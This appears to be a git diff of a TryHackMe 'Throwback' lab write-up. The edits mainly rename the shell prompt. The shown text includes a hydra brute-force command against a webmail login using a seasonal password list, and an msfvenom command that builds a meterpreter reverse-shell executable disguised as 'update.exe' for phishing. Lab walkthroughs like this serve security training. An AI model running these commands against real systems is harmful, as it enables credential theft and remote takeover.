@@ -1,4 +1,5 @@
 # RECON
+
 ```console
 $ sudo ./pymap.py -t 10.200.11.232 -A
                                                     
@@ -129,7 +130,7 @@ hydra -L nickname.txt -p <password> 10.200.11.232 http-post-form '/src/redirect.
 
 I tried with `securitycenter` and `WelcomeTBH1!`. It did't works... I was thinking to go for rockyou.txt but I gut said that I should check THM and They might mention something about a costumized wordlist, and yes they did. So I created wordlist
 ```console
-kali@kali:~/THM/throwback$ cat pass.txt 
+bibo318@parrot:~/THM/throwback$ cat pass.txt 
 Spring2020
 Summer2020
 Fall2020
@@ -141,7 +142,7 @@ Management2020
 ```
 now let run the attack
 ```console
-kali@kali:~/THM/throwback$ hydra -L nickname.txt -P pass.txt 10.200.11.232 http-post-form '/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=incorrect' -v -t 64
+bibo318@parrot:~/THM/throwback$ hydra -L nickname.txt -P pass.txt 10.200.11.232 http-post-form '/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=incorrect' -v -t 64
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-03 06:36:31
@@ -178,7 +179,7 @@ seem like we can reset userser password by just viste that links. Unfortunally w
 # phishing
 Let start by creating own reverse shell payload using `msfvenom` using staged Windows payload
 ```console
-kali@kali:~/THM/throwback$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f exe -o update.exe
+bibo318@parrot:~/THM/throwback$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f exe -o update.exe
 ```
 now set a msfconsole to listen for incomming shell
 ```
